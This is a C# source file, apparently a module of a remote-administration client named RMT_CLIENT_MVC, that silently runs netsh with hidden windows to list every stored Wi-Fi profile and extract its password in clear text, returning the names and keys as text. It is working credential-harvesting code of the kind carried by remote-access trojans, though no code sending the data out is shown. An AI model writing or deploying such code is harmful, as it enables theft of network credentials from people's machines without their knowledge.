using System;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Collections.Generic;

namespace RMT_CLIENT_MVC
{
    public static class WifiManager
    {
        public static (string output, bool isError) GetStoredNetworks()
        {
            try
            {
                var wifiProfiles = GetWiFiProfiles();
                if (wifiProfiles.Count == 0)
                {
                    return ("No se encontraron perfiles Wi-Fi.", false);
                }

                var wifiInfo = new List<string>();
                foreach (var profile in wifiProfiles)
                {
                    string key = GetWiFiKey(profile);
                    if (!string.IsNullOrEmpty(key))
                    {
                        wifiInfo.Add($"Red: {profile}, Password: {key}");
                    }
                    else
                    {
                        wifiInfo.Add($"Red: {profile}, Password: [No disponible]");
                    }
                }

                return (string.Join("\n", wifiInfo), false);
            }
            catch (Exception ex)
            {
                return ($"Error al obtener contraseñas WiFi: {ex.Message}", true);
            }
        }

        private static List<string> GetWiFiProfiles()
        {
            try
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = "wlan show profiles",
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        StandardOutputEncoding = System.Text.Encoding.GetEncoding("latin1")
                    }
                };

                process.Start();
                string profilesOutput = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // Compatible con español e inglés
                var regex = new Regex(@"Perfil de todos los usuarios\s*:\s*(.+)|All User Profile\s*:\s*(.+)");
                var matches = regex.Matches(profilesOutput);

                var profiles = new List<string>();
                foreach (Match match in matches)
                {
                    string profile = !string.IsNullOrEmpty(match.Groups[1].Value) ?
                                    match.Groups[1].Value :
                                    match.Groups[2].Value;
                    profiles.Add(profile.Trim());
                }

                return profiles;
            }
            catch (Exception ex)
            {
                throw new Exception($"Error obteniendo perfiles Wi-Fi: {ex.Message}");
            }
        }

        private static string GetWiFiKey(string profile)
        {
            try
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = $"wlan show profile name=\"{profile}\" key=clear",
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        StandardOutputEncoding = System.Text.Encoding.GetEncoding("latin1")
                    }
                };

                process.Start();
                string profileOutput = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // Compatible con español e inglés
                var regex = new Regex(@"Contenido de la clave\s*:\s*(.+)|Key Content\s*:\s*(.+)");
                var match = regex.Match(profileOutput);

                if (match.Success)
                {
                    return !string.IsNullOrEmpty(match.Groups[1].Value) ?
                           match.Groups[1].Value.Trim() :
                           match.Groups[2].Value.Trim();
                }
                return null;
            }
            catch (Exception ex)
            {
                throw new Exception($"Error obteniendo clave para el perfil '{profile}': {ex.Message}");
            }
        }
    }
} 